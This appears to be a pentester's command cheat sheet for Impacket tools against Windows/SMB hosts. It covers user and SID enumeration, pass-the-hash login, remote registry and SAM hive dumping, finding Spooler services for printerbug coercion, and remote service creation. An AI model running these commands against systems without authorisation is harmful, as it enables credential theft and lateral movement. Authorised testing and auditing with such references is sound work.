# Impacket

% impacket, windows, smb, 445

## lookupsid - SID User Enumeration,  extract the information about what users exist and their data. 
#plateform/linux #target/remote #cat/RECON 

```
lookupsid.py -domain-sids <domain_fqdn>/<user>:<password>@<ip>
```

## lookupsid - SID User Enumeration,  extract the information about what users exist and their data.  (pth)
#plateform/linux #target/remote #cat/RECON 

```
lookupsid.py -hashes :<nt_hash> -domain-sids <domain_fqdn>/<user>@<ip>
```


## reg - query registry info remotely
#plateform/linux #target/remote #cat/RECON 
```
reg.py '<domain_fqdn>/<user>:<password>'@<ip> query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
```
## reg - dump sam remotely
#plateform/linux #target/remote #cat/RECON 
```
reg.py '<domain_fqdn>/<user>:<password>'@<ip>  backup -o '<smb_share_UNC>'
```

## rpcdump - list rpc endpoint
#plateform/linux #target/remote #cat/RECON 
```
rpcdump.py '<domain_fqdn>/<user>:<password>'@<ip>
```


## rpcdump - Find Spooler services (printerbug coerce)
#plateform/linux  #target/remote #cat/RECON 
```
rpcdump.py <domain_fqdn>/<user>:'<password>'@<dc_name> | grep MS-RPRN
```

## rpcdump - Find anonymous Spooler services (printerbug coerce)
#plateform/linux  #target/remote #cat/RECON 
```
rpcdump.py <dc_name> | grep -A 6 MS-RPRN
```

## services.py - (start, stop, delete, read status, config, list, create and change any service) remote
#plateform/linux #target/remote #cat/RECON  #cat/ATTACK/EXPLOIT  
```
services.py '<domain_fqdn>/<user>:<password>'@<ip> <action>
``` 

## getarch - find target architecture (64 or 32 bits)
#plateform/linux #target/remote #cat/RECON 
```
getArch.py -target <ip>
```

## netview - enumeration tool (ip/shares/sessions/logged users) - need dns set
#plateform/linux #target/remote #cat/RECON 
```
netview.py <domain_fqdn>/<user> -target <ip> -users <users_file>
```


